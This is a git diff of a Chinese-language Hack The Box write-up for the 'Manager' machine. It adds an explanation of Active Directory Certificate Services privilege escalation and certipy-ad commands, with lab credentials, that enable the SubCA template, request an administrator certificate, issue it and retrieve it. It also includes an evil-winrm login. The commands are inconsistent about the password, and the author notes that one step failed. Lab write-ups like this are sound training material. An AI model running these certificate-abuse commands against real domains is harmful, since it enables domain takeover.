@@ -571,8 +571,12 @@ website-backup-27-07-23-old.zip
 `evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'`
 
 #### root
+ADCS提权
+> 由于这是一台Active Directory计算机，因此域可能包含作为公钥基础结构的Active Directory证书服务（ADCS）。ADCS可能包含严重的漏洞，可利用这些漏洞获取其他用户的证书和哈希，从而允许权限提升。（另请参阅https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
 ......
-总之是发现了aad证书相关的东西
+
+
+
 然后使用`certipy-ad`这个工具创建一个'officer'账户来为我授权
 
 ```bash
@@ -582,8 +586,10 @@ certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username 'raven@mana
 #启用名为 SubCA 的证书模板。这个模板通常用于签发子CA证书。
 certipy-ad req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn 'administrator@manager.htb'
 #执行这个命令后,将向 manager-DC01-CA 证书颁发机构请求签发一个新的子 CA 证书。这个子 CA 证书将被颁发给域 manager.htb,并使用启用的 SubCA 模板进行签发。同时,证书中将包含 administrator@manager.htb 的用户主体名称(UPN)。
-certipy-ad ca -ca 'manager-DC01-CA' -issue-request 22 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123*'
-#manager-DC01-CA 证书颁发机构将签发之前通过 certipy-ad req 命令提交的请求ID为22的证书请求，并生成一个新的子CA证书。
+certipy-ad ca -ca 'manager-DC01-CA' -issue-request 17 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123*'
+#这块一直失败Got access denied trying to issue certificate....manager-DC01-CA 证书颁发机构将签发之前通过 certipy-ad req 命令提交的请求ID为17的证书请求，并生成一个新的子CA证书。
+certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve 17
+#
 ```
 ### Sandworm
 #### user
